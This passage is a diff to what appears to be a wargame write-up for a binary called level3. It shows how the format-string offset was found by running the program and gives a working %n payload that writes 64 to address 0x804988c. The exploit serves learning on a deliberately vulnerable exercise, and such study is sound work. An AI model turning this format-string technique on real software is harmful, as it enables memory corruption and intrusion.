@@ -16,9 +16,7 @@ and pass the branch. (the buffer is large but fgets caps the BOF)
 ```
 
 ## Exploit
-- offset 4 (derivation): in `AAAA%x %x %x %x`, `41414141` appears at the **4th** `%x` →
-  the first 4B of input are argument slot 4. (printf is in the same function `v` as fgets,
-  so the slot is close)
+- offset 4 (VERIFIED by running): ./level3 <- AAAA%x %x %x %x %x prints AAAA 200 b7fd1ac0 b7ff37d0 41414141 25207825. 41414141 shows up at the 4th %x → the first 4B of input sit at argument slot 4. (the 5th value 25207825 is the ASCII of "%x " itself = the format string reading its own bytes, which confirms slot 4 is the start of our buffer.) WHY find the slot: it decides which stack arg %n will hit, i.e. where we must plant the target address, i.e. how many %x to burn first. Rule: buffer at slot N -> need (N-1) %x before %n. Here N=4 -> three %x.
 - Value/address: address `0x804988c` (source: `mov 0x804988c` @ v+54), target `0x40 = 64`
   (cmp @ v+59).
 - payload: `\x8c\x98\x04\x08` + `%08x%08x%044x` + `%n`.
